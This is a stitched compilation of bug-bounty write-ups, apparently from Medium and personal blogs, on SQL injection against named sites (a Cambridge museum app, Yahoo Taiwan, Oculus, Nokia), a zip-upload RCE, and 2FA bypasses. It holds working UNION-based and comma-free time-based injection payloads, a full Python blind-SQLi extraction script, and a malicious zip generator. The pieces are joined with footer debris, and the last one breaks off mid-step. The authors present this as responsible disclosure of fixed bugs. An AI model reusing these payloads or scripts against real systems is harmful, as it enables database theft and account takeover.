The SQL SELECT statement is used to fetch the data from a database table which returns this data in the form of a result table. These result tables are called result-sets. — — — — — — Syntax The basic syntax of the UNION SELECT statement is as follows UNION SELECT column1, column2, columnN FROM table_name; http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=’named_individuals_sum’ union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+ Press enter or click to view image in full size Getting Required Data Finding Version, User and Database name SQL provide function for that For example version(),User() and database() Version() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ Output: 5.1.39-community Press enter or click to view image in full size User() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ output: root@koala.fitzmuseum.cam.ac.uk Press enter or click to view image in full size Database() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ Output: wn_index Press enter or click to view image in full size Video Demonstration: https://youtu.be/tK88xAwuF2w I reported last week and vulnerability Fixed :) I hope you like the Article Thanks for Reading and Happy Hunting :) Programming Infosec Cybersecurity Bug Bounty -- -- 2 Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Few days ago I’ve tested a private site, I used the site name like “site.com”. The company provide services via ip address. I dont know about their full service details. I just check bugs my regular testing way in their userpanel. While testing I found some issues, like clickjacking, open redirection, and xss also. After reported multiple bugs via mail ask them about update process they said, Then I asked them about bounty, They said, Press enter or click to view image in full size I was disappointed to see their reply. I thought may be they consider the xss issues. But they don’t accept any bug for bounty without sql injection. :( In this time they already fixed the issues. But that time I was in vacation and spent time without my pc. So I can’t check any sql injection that time. I was dissapointed but my mind was thinking there’s must be a point to do sqli. After fews days I back my work and start finding all endpoints. So, for finding any parameters I normally used auckentix. I dont like to use any tool, but sometimes it helps. I just start searching many parameters but no params is vulnerable. Finally I found a parameter that is vulnerable to “ union based injection ” i was happy but can’t find any vulnerable column. In this mean time I found a Another parameter like https://site.com/ress/xx-list/os-detail?os=xxxxxxxxx . This parameter is sqli vulnerable also. Then try my all sql injection learning tricks. First I fix the query in a normal process. I try with “union based” https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx'--+ (query fixed) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 1 — + (ok) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 15 — + (error) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 11 — + (ok) there is 11 columns :) Previous endpoint had 14 columns but no vulnerable column. https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' +UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11)) — + Got the vulnerable point. Vulnerable column was 2,3,4,8. Then I try to print DB,version, OS, port and all others in the front page. This is now easy task to do other parts. https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),3,4,5,6,7,8,9,10,11 — + Press enter or click to view image in full size Then I try to print tables schema, https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name) from information_schema.tables where table_schema),4,5,6,7,8,9,10,11 — + Tables Schema printed. https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema=database()),4,5,6,7,8,9,10,11 — + But I got a problem there to print full table via union select query.

Inject in insert/update queries without it A writeup regarding exploiting SQL injection issue in an insert query while it wasn’t possible to use a comma at my payload at all. 35 0 Tweet Share TL;DR This blog post is about the exploitation of one of the interesting SQL injection issues I found during bug hunting. The interesting part was the exploitation, the vulnerable endpoint was using insert query and I wasn’t able to use commas due to the application’s logic. After some search, I successfully exploited the issue using the following payload xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' as a base for my exploit code, reported it and gained 10,000$ for that one. An unnecessary introduction Injection in the update or insert queries is known since a long time ago. As in any SQL injection issue, the problem arises from using unsanitized input before passing it to the SQL query. Dummy example $email=$_POST['email']; $name=$_POST['name']; $review=$_POST['review']; $query=\"insert into reviews(review,email,name) values ('$review','$email','$name')\"; mysql_query($query,$conn); A normal request such as review=test review& [email protected] &name=test name will result in the following SQL query insert into reviews(review,email,name) values ('test review',' [email protected] ','test name'); Selecting that column will result in MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review',' [email protected] ','test name'); Query OK, 1 row affected (0.001 sec) MariaDB [dummydb]> select * from reviews; +-------------+------------------+-----------+ | review | email | name | +-------------+------------------+-----------+ | test review | [email protected] | test name | +-------------+------------------+-----------+ 1 row in set (0.000 sec) So to exploit the issue we have multiple options, Exploiting it as an error based injection setting any parameter to test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1 This will result in a SQL error disclosing the DBname MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1',' [email protected] ','test name'); ERROR 1105 (HY000): XPATH syntax error: ' dummydb' Using subqueries In case the SQL errors were being handled we may use subqueries to execute our SQL query, write the output into any column and read it later. Example: setting the review parameter’s value to jnk review',(select user()),'dummy name')-- - Will result in making the query looks like insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name')-- -,' [email protected] ','test name'); so the following part ,' [email protected] ','test name'); Will be ignored and the Email value will just become the output of the (select user()) query MariaDB [dummydb]> insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name');--,' [email protected] ','test name'); Query OK, 1 row affected (0.001 sec) MariaDB [dummydb]> select * from reviews; +-------------+------------------+------------+ | review | email | name | +-------------+------------------+------------+ | test review | [email protected] | test name | | jnk review | root@localhost | dummy name | +-------------+------------------+------------+ 2 rows in set (0.000 sec) MariaDB [dummydb]> Straight forward and so easy. Exploitation using blind injection In case there is no error being thrown, being unable to view the data we just inserted or even there were no way to indicate whether if our query resulted in a true or false condition, we can move to the time-based injection, this can be easily done using the following payload xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx If the query output is true, the DBMS will sleep for 5 seconds, using that technique we can obtain the data needed from the DB. Quick reference: https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/ The problem So, overall exploiting such issue isn’t a big deal, But the scenario in that specific bug was different. The vulnerable parameters, urls[] and methods[] were getting split by “ , ” which made it obvious to me after few tries that I won’t be able to use a comma at the exploitation scenario by any mean. pseudo example $urls_input=$_POST['urls']; $urls = explode(\",\", $urls_input); print_r($urls); foreach($urls as $url){ mysql_query(\"insert into xxxxxx (url,method) values ('$url','method')\") } So based on the previous piece of code if we set the urls parameter to xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx The input will be split and converted into Array ( [0] => xxx'-(IF((substring((select database()) [1] => 1 [2] => 1)) = 'd' [3] => sleep(5) [4] => 0))-'xxxx ) Which is totally meaningless when being handled by the SQL server The solution So the solution should include a payload which doesn’t contain a comma at all. So the 1st step is finding a replace the IF condition which requires commas to work with another alternative suitable to our case. The case when statement was just perfect for that The CASE statement goes through conditions and return a value when the first condition is met (like an IF-THEN-ELSE statement). So, once a condition is true, it will stop reading and return the result. If no conditions are true, it will return the value in the ELSE clause. If there is no ELSE part and no conditions are true, it returns NULL. basic usage is MariaDB [dummydb]> select CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END; +--------------------------------------------------------------------------+ | CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END | +--------------------------------------------------------------------------+ | 0 | +--------------------------------------------------------------------------+ 1 row in set (3.001 sec) This will sleep for 3 seconds if the condition is true. The 2nd step is finding an alternative the substring , that’s relatively easy, we may use like operator to achieve that Basic example MariaDB [dummydb]> select CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END; +----------------------------------------------------------------------+ | CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END | +----------------------------------------------------------------------+ | 0 | +----------------------------------------------------------------------+ 1 row in set (3.001 sec) This will sleep 3 seconds if the 1st char of the (select database()) query equal to the character ‘ d ‘. The last step is to concatenate this query along with the insert one. For some reason, the direct concatenation in the form of http://xxxxxxxx/'-(select CASE WHEN ((select database()) like 'd%') THEN (sleep(4)) ELSE 2 END)-'xxx Didn’t work on the target’s side, I had to cast the case when as char to overcome that so the full payload became urls[]=xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' Exploitation That would be so exhausting to exploit manually so I wrote a simple script to automate the data extraction process import requests import sys import time # xxxxxxxxxexample.com SQLi POC # Coded by Ahmed Sultan (0x4148) if len(sys.argv) == 1: print ''' Usage : python sql.py \"QUERY\" Example : python sql.py \"(select database)\" ''' sys.exit() query=sys.argv[1] print \"[*] Obtaining length\" url = \"https://xxxxxxxxxexample.com:443/sub\" headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Cookie\": 'xxxxxxxxxxxxxxxxxxx', \"Referer\": \"https://www.xxxxxxxxxexample.com:443/\", \"Host\": \"www.xxxxxxxxxexample.com\", \"Connection\": \"close\", \"X-Requested-With\":\"XMLHttpRequest\", \"Content-Type\": \"application/x-www-form-urlencoded\"} for i in range(1,100): current_time=time.time() data={\"methods[]\": \"on-site\", \"urls[]\": \"jnkfooo'-cast((select CASE WHEN ((select length(\"+query+\"))=\"+str(i)+\") THEN (sleep(1)) ELSE 2 END) as char)-'\"} response=requests.post(url, headers=headers, data=data).text response_time=time.time() time_taken=response_time-current_time print \"Executing jnkfooo'-cast((select CASE WHEN ((select length(\"+query+\"))=\"+str(i)+\") THEN (sleep(1)) ELSE 2 END) as char)-'\"+\" took \"+str(time_taken) if time_taken > 2: print \"[+] Length of DB query output is : \"+str(i) length=i+1 break i=i+1 print \"[*] obtaining query output\\n\" outp='' #Obtaining query output charset=\"abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-.\" for i in range(1,length): for char in charset: current_time=time.time() data={\"methods[]\": \"on-site\", \"urls[]\": \"jnkfooo'-cast((select CASE WHEN (\"+query+\" like '\"+outp+char+\"%') THEN (sleep(1)) ELSE 2 END) as char)-'\"} response=requests.post(url, headers=headers, data=data).text response_time=time.time() time_taken=response_time-current_time print \"Executing jnkfooo'-cast((select CASE WHEN (\"+query+\" like '\"+outp+char+\"%') THEN (sleep(1)) ELSE 2 END) as char)-' took \"+str(time_taken) if time_taken > 2: print \"Got '\"+char+\"'\" outp=outp+char break i=i+1 print \"QUERY output : \"+outp Demo usage [19:38:36] root:/tmp # python sql7.py '(select \"abc\")' [*] Obtaining length Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=1) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.538205862045 Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=2) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.531971931458 Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=3) THEN (sleep(1)) ELSE 2 END) as char)-' took 5.55048894882 [+] Length of DB query output is : 3 [*] obtaining query output Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'a%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.5701880455 Got 'a' Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'aa%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.635061979294 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'ab%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.61513400078 Got 'b' Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'aba%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.565879821777 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'abb%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.553005933762 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'abc%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.6208281517 Got 'c' QUERY output : abc The script in action And the final result was In a nutshell You can achieve the goal by using the following payload as a base for your exploit xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' Happy hacking Bugbounty SQL injection Web pentest Keep reading More > Windows authentication attacks part 2 – kerberos Kerberos authentication is one of the cores of the AD, knowing how it works facilitates the deep understanding of many attacks.

I discovered a root access SQL injection on tw.yahoo.com. The vulnerability here is an old TW Yahoo page that delivers json content based on an ID specified. Legitimate URL: https://tw.stock.yahoo.com/q/getjson.php?s=22301 Return: {\"id\":\"22301\",\"type\":\"stock\",\"relation\":[]} After messing with the s request variable , I noticed that it was not typecasted as integer and allowed any special character. First I checked special characters such as a single-quote - it allowed special characters, but it did not cause any server-side errors. A trick that I have picked up over the years is that sometimes websites will accidentally double decode user input. By passing in the value %2527, it would decode into % and 27, and decode an additional time into a single-quote. The problem is that they were stripping single quotes after the first decode and not the second. This allows all special characters unescaped in the SQL query, including an unescaped single-quote. Full injection URL: https://tw.stock.yahoo.com/q/getjson.php?s=%2527 union select user(),schema(),4,5,6,7,%25278 Return: {\"id\":\"' union select user(),schema(),4,5,6,7,'8\",\"type\":\"stock\",\"relation\":[{\"id\":\"root@localhost\",\"[redacted]\":\"Quote\",\"ud\":\"7\"}]} With root select access to a database, you can pull any information you want including the MySQL user password hashes.

Hi, This is my first blog post so I am very excited to share this. This is the story of 3 SQL injection which i found on a program. I am not taken name of that instead let’s say “abc.com” domain. So as proceed with my first step to collecting the url’s of abc.com domain. So I started digging and collect hundred of urls. And then i started to see if i get some interesting one. And yes, I found a very interesting url which contains a lot of parameters. Something like this. “ http://abc.com/file.php?ref=-3&uploader=plupload&single=&local=&search=&offset=0&order_by=relevance&sort=DESC&archive=0&collection=&metadatatemplate=&relateto=&redirecturl=” Now I was very curious to test this URL because more params more opportunities. My first test case is always “XSS” (Developer most of the time forgot to sanitize all the input parameters.). So i started digging for XSS but failed. Now I move on to the SQL by injecting the single quote (‘) to each of the parameter and one parameter i found that is vulnerable to the SQL injection and i.e. sort=DESC. When i inject single quote to that parameter and luckily i got the SQL syntax error with leaking the database name and version no. Then I was like I quickly submitted that bug to the team. And then i took a deep breath and sit aside. Next day, again i started to check the all the url which are found yesterday to test some other vulnerabilities but wait a minute. There is a POST request for edit the profile, and When we click the submit button the POST request contains post parameter and in these i found interesting parameter “resource_type=2\" So i submitted single quote to that, again i found beautiful SQL syntax error. (Off course this was not the case for XSS and any other.) One last, On that request i saw that there is a same parameter which i found first i.e. sort=DESC in the cookie section, so i was pretty sure that this is also be vulnerable and Yes it is. So i submitted all 3 SQL bugs to that company. I didn’t sleep full night, Excitement ;), And quickly i got triage and Resolved Reputation. But No rewards, they notified “At this time we are not award any bounties and cash rewards” on the Report policy as i know. But I will never forget that awesome feeling when i found. But anyways through this experience, We should agree that “Web application always have some vulnerabilities so you are need to find them which are hidden behind the curtains.” Thank you.

This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix!

Here’s the full content:\n\nJosip Franjković - archived security blog: Step-by-step: exploiting SQL injection(s) in Oculus' website. Josip Franjković - archived security blog Friday, 5 September 2014 Step-by-step: exploiting SQL injection(s) in Oculus' website. Hello, Some time ago Jon of Bitquark tweeted that he found a SQL injection and RCE in one of Facebook's acquisitions. You can find Jon's blog about the RCE vulnerability here . I guessed it was Oculus' website and started looking for more SQL injections and other vulnerabilities, resulting in a total of 5 SQL injections and a couple smaller vulnerabilities. Of those 5 injections, two were duplicate. I am not going to write about all 5 of them, but the one I have exploited to gain administrator user: SQL injection in developer.oculusvr.com/core/CompanyAction.php A POST parameter \"Domain\" was vulnerable to SQL injection, but there were few problems that made exploitation harder. Problem one: Syntax error was needed to differentiate true from false. The usual 'and'a'='a did not work and I needed to get syntax error for false. Lets build the basic true/false check: Domain='and (select 1 union select case when (1)=1 then 1 else 2 end) and '@test.com So, when 1=1 then the subquery looks like (select 1 union select 1) which is a valid query. Now, for 2=1 the subquery would be (select 1 union select 2) and it is an error, because subquery returns more than one row. We have the basic idea for true/false responses now. Problem two: No whitespaces. Oculus' domain filter required domain not to have whitespaces. Lets change the query to bypass this. I have decided to go with combination of comments /**/ and parenthesis. So: Domain='and(select(1)union(select(case/**/when(1)=1/**/then/**/1/**/else/**/2/**/end)))and'@test.com Great, this works too! Problem three: No commas. This one is a bit tricky. For blind injection we generally need LIMIT, substr() and other functions that need a comma. Well, they actually do not. After going through MySQL docs I saw comma-less syntax is possible for both LIMIT and substr(): LIMIT 0,1 is same as LIMIT 1 OFFSET 0 substr('Hello',1,1) can be used as substr('Hello' from 1 for 1). Here is the query to get database column name - character by character: 'and(select(1)union(select(case/**/when((select/**/ascii(substr(column_name/**/from/**/1/**/for/**/1))/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'xxxxxxxxxxxxxxx'/**/limit/**/1/**/offset/**/0))=97/**/then(1)else(2)end)))and'@test.com I have guessed the table name, and parts of column names for sessions table using LIKE and a bit of luck. Problem four: it is blind injection, therefore slow. I did not use sqlmap for this, but I did help myself with Burp's Intruder. Since the goal was admin's PHPSESSID and it is [0-9][a-z], I simply set Intruder to bruteforce using that character set until it finds a true response, and then manually took out the characters and assembled a PHPSESSID. It was still slow, but okay - around 10 minutes on average to get the whole 26 characters long string. It would be faster but I actually needed to do another request to see if response is true/false - you'd first get 302 redirected, then see the response. Because of this I had to use one thread only and a small delay between requests, around 0.3 seconds. Using the PHPSESSID I logged in to admin panel. Jon's way to get command execution still worked, the panel was also vulnerable to more SQL injections. I have started reporting all those, but was asked to log out - which I did. I have also tried to get RCE using file-uploads, but as far as I know it did not work. That is all folks, thanks for reading :-). I would like to thank Jon of Bitquark for sharing knowledge, Oculus for not using prepared statements, and Facebook for running the bounty program. The vulnerabilities were fixed in a few days. Oh yeah, most of this stuff I learned with/from a CTF team - you can find their blog here and their security challenges here . Posted by Josip Franjković at 01:16 Email This BlogThis!

Early this month I got invited to a private bug bounty program running on HackerOne and for obvious reasons I'll not name the company here. As soon I got invited to the program I asked some friends that were into this very same program before myself if they knew some \"fishy\" areas in the application that they were willing to share with me, well this is what friends are for. :) Talking to https://twitter.com/reefbr he sent me a self-register page in a critical domain (in-scope). The registration went through without any problem and a few seconds after hit the send button I got an email with the access details. With my self-registered user working good it was very quick to found a file upload feature within the application. File Uploads functions are straightforward so I tried to upload a random file to see if any security control was in place by the application. The limitations that I found were: PDF files accept only AV running on the backend server After poking around the upload function, I realise that the application was only validating the file type extension, such as \" filename .pdf \". I did several tries to bypass this validation and I got success in some, but in the end I did not reach any execution in the server-side, time to change the strategy. Back in the past, when doing my official daily duties as a Penetration Tester I came across a web application that was including the filename into the database, as far I remember that time I got a Blind (time-based) SQL Injection in the filename parameter . So, why not test in this application? Burp Proxy set to intercept the HTTP requests, then I hit the Upload button in the application and replace the original filename parameter to: Note: I tried to send the request without the .pdf extension but the application was rejecting. BTW, this is the same payload used by the Burp Scanner for active tests. The application was running \"behind\" the Cloudflare WAF, so after some tries to confirm if the application was vulnerable all my requests were getting the \"Access Denied\" message. Now it's time to bring back https://twitter.com/reefbr , Manoel had reported a Cloudflare bypass to the same program and again... he told me about this. Using the bypass (configuration issue) found by @reefbr I did manage to confirm the SQL Injection (finally). Talk is cheap show me the PoC. Initial request bellow: Let's increase the sleeping time... Going up a bit on the sleeping time: Let's make sure that the triage team will understand and be able to reproduce, so +1 request... That's all folks, hope you did enjoy. As a final note, this private program is handling very sensitive information (PII) so extracting any data would create new issues to the program's owner. Having this in mind, I choose to proceed with the exploitation process by using the sleep payload and comparing the responses time to proof the vulnerability.

Pardon me if there are any mistakes as this is my first write-up.! So let’s get started! Introduction: Whenever i start my hunting on any bug bounty program at first, i use the application as a normal user. It allows me to understand how the application’s workflow. And let me understand which features can be interesting to test. I noticed that the application had a 2FA ( Two Factor Authentication) feature, I enabled it and I started to play with it. As soon as i enabled it, I noticed that it was a Time-based One Time Password 2FA. Like after every 30 seconds the OTP was changing inside the Google Authenticator app. But i was provided some backup codes in case i don’t have access to my device for TOTP. Now that was something interesting. Damnn!!! Bypass: So while playing around the application, I enabled the 2FA. After enabling 2FA, i got some backup codes in case i don’t have access to my device for the TOTP. I have noted all the backup codes. The backup codes were of 8 digits. I logged out of the application to test the 2fa. :P So after entering the email address and password. I was asked to enter the TOTP. But there was option to login to the application using the backup codes. I clicked on it. And intentionally, put a random 8 digit number instead of that 8 digit backup code and to my surprise, it was accepted and i was successfully logged in to the application! In short, there was no validation for the backup code. They were not validated and hence any random 8 digit would work. Yayyy!!!! It was weird to me but i knew it’s a security bug. :D :D Takeaway: Sometimes, you don’t need any tools to find valid bug. It’s just about having positive mindset while looking for loopholes. Understand the application workflow and try looking for issues which would affect the functionality of the application. Always think like a proton. Expect the UnExpected!!

Josip Franjković - archived security blog Tuesday, 30 July 2013 SQL injections in Nokia sites. Hello, I have found out about Nokia security reward program somewhere mid-April. Reports of people getting one or more mobile phones made me interested and I started searching for bugs. As usual XSS/CSRF did not bring people real reward (only Hall of Fame), I started looking for SQL injections (and SQL injections only). In one week I have found total of 4 SQL injections in their sites, but will write about three of them as fourth one is fairly similar to one of these three. So: SQL injection in www4.nokia.de Found this site using Google. The actual vulnerable link was: http://www4.nokia.de/storelocator/ Vulnerable variable is the User-Agent header , there was no response on page except for blank or load, so it was blind SQL injection . The query behind was INSERT INTO, MySQL was the database. So, how do you exploit something like INSERT INTO table(a,b,c)VALUES(1,2,'$user_agent') if there is no error reporting, and you cannot see output from the database? After trying to make valid PoC for 10 minutes, I did not know what to do. So, I asked one of my old friends, Bryan de Houwer . Few minutes later, he said \" Hey, did you try inserting into multiple rows? \"... I forgot that, for some reason. You could do something like INSERT INTO table(a,b,c)VALUES(1,2,3),(4,5,6); Great! After some brute-forcing, I found out the INSERT query had 5 columns. Setting my User-Agent to ',1,1),(1,2,3,4,5)-- - The site loaded, meaning the query worked. Now, you cannot use usual AND 3=23 in INSERT queries, as INSERT INTO a(b)VALUES(1 and 3=23); is a valid query, and it will go through - meaning I cannot get any data. I needed some way to trigger error for true/false. Now what? One of my favorite blind SQL injection tricks is to make the database return multiple rows in a subquery . For example, SELECT a,(select b from table) from table; will return \"Subquery returns more than 1 row\" - if there is more than one row, of course. Now, I used the UNION keyword to do the trick for me: SELECT 1 UNION SELECT 2; -> \"Subquery returns more than 1 row\"; with a CASE statement, my final injection looked like: User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)= 5 ) then 1 else 2 end))-- - The page loads. User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)= 4 ) then 1 else 2 end))-- - Blank. See the change in version. Time-line: 22. April 2013 - Vulnerability reported. 22. April 2013 - Response from Nokia Team 23. April 2013 - Vulnerability fixed (That was pretty fast!) SQL injection in *********** URL is hidden for now, as there is still one unpatched vulnerability. As soon as it gets patched, I am publishing it. Found this site using ********** This is a PHP site from <2005. I think this told you enough. Login using User: ' or 'x'='x Pass: 'or 'x'='x From there, pretty much every SINGLE... well, everything was vulnerable to SQL injection. The DB was PostgreSQL. Error reporting was on. Multiple queries, DROP/CREATE privileges, much like connecting to your database and sending your own queries. Time-line: 23. April 2013 - Reported 23. April 2013 - Reply from Nokia Team 25. April 2013 - Fixed (took them some time to find login details). Gotta love old, forgotten sites. Nokia.es subdomain SQL injection Got no idea how I found this one. The injection is blind, time based. PICTURES! True: False: Conclusion: Fourth SQL injection is almost the same as first. Nokia fixed those bugs really fast. I was awarded a single Nokia Lumia 820 (yellow color, looks great and is an amazing phone) and the Top Reporter status for April. Although those vulnerabilities were found in short time frame, and I was not really working my ass off, I have expected at least a Lumia 920 or another Lumia 820 - I know of people who got multiple phones for XSS/CSRF in similar domains. I would like to thank the Nokia Incident Response Team for their quick fixes, and Bryan de Houwer for reminding me of multiple inserts in SQL. Posted by Josip Franjković at 16:58 Email This BlogThis!

I’m again with another story. I love 2FA, not because it provide extra security. Because of satisfaction to bypass them. Stay tuned with me because I’ll post more story on 2FA bypass. Enjoy the story !! It was first day of 2020. I found a way to bypass 2fa in a website. I was randomly searching bug bounty program with GHDB. And found a domain that is allowing users to enable 2fa with google authentication app. Challenge accepted… First I tried in login page. Tries every possible way but didn’t get any success. Then I thought lets look at the forget password page, I Entered my email ID and and clicked on ‘forgot password’ . After few seconds I got an email that looks like this: https://app.domain .io/reset/645hNr78tr5410HgG6yvYZtk2Y 45lki7/ I visited the url and entered a new password. After clicking submit, a new window opened that asking me 2FA code. So I first tried with response manipulation. But didn’t work. Then I looked at the request to see what was going on with my 2fa code. That was a POST request and in the body I found ‘ reset_key ’, ‘ _csrf ’, ‘ email ’, ‘ password ’ and ‘ token ’ parameters. ‘token’ is my 2FA code. I deleted token parameter and it’s value. Then I forwarded the request. And BOOM… I was redirected in my account with a notification : “Password successfully changed” . I was like… Thank you for your time. Hope you enjoyed this story. Happy Hunting.!!

OTP is treated as an additional measure for security termed as 2FA. For those who don't know about, what is 2FA? Two-factor authentication (2FA) , sometimes referred to as two-step verification or dual factor authentication, is a security process in which the user provides two different authentication factors to verify themselves to better protect both the user’s credentials and the resources the user can access. Generally, OTP is a combination of 4 digits starting from 0000 to 9999. If we count there 10,000 combinations. In the age of powerful computer 10,000 combinations take only a few minutes to process. If OTP verification is not properly managed, anyone can bypass this with a simple brute force. Why I was able to bypass the 2FA? No rate limiting on an unsuccessful attempt No new OTP policy on X unsuccessful attempt Few prerequisites: Web Browser Burp Suite Now let's see how I was able to bypass the 2FA with burp suite:- Step 01: Logged into the website using the mobile number and entered the wrong OTP to intercept on burp suite Press enter or click to view image in full size Pannel to enter the OTP received on the Mobile Number Press enter or click to view image in full size Intercept the Verify OTP API call on Burp Suite Step 02: Sending the verifyOTP API call to the intruder. Press enter or click to view image in full size Image showing the Dialogue box to send intruder. Press enter or click to view image in full 